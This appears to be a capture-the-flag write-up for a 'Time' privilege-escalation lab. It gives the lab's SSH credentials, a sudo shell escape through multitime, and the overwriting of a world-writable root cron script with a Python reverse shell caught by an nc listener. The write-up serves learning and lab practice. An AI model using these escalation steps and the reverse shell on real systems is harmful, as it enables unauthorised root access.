# Name: Web: Privilege Escalation: Time

## Vulnerability

Cron job are programs or scripts that are scheduled to run automatically at specific times or intervals by script or command.
The system-wide crontab is located at /etc/crontab.

One of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

## Exploit

Connect with ssh to user ```time:EDBVCjNFAAzYedCX```, port 2022.

### First escalation

Let's check our sudo permission on the target system:

```linux
time@time:~$ sudo -l
Matching Defaults entries for time on time:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User time may run the following commands on time:
    (wormhole) /usr/bin/multitime
```

We can see that user ```time``` can run the ```multitime``` util as wormhole user.
It can be used to break out from restricted environments by spawning an interactive system shell if the binary is allowed to run as superuser by sudo.

```sudo multitime /bin/sh```

We can run the multitime binary as wormhole user:

```sudo -u wormhole /bin/multitime /bin/sh```

And now we escalated to ```wormhole``` user!

### Second escalation

Reading the ```/etc/crontab``` file we can see that the ```root``` user is running a python script which is located inside the ```wormhole``` home directory.

```bash
cat /etc/crontab

* * * * * root /usr/bin/python /home/wormhole/time-travel.py
```

This line of the crontab file translates that in every minute, the root user is running that ```time-travel.py``` script.

Checking for file permissions of that script, we can spot that the ```wormhole``` user has writing permission.

```bash
ls -la /home/womrhole/time-travel.py
-rwxr-xrwx 1 root root 242 Jul 24 15:20 /home/wormhole/time-travel.py
```

This means that we can overwrite the content of this file: we will try to use a reverse shell in python:

Modify the content of the ```/home/wormhole/time-travel.py``` file:

```python
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 6969))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system("/bin/sh -i")
```

Now, open a netcat connection on port ```6969```:

```bash
nc -nvlp 6969
```

Wait for 1 minute and we are root:

```bash
Listening on 0.0.0.0 6969
Connection received on 127.0.0.1 38646
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```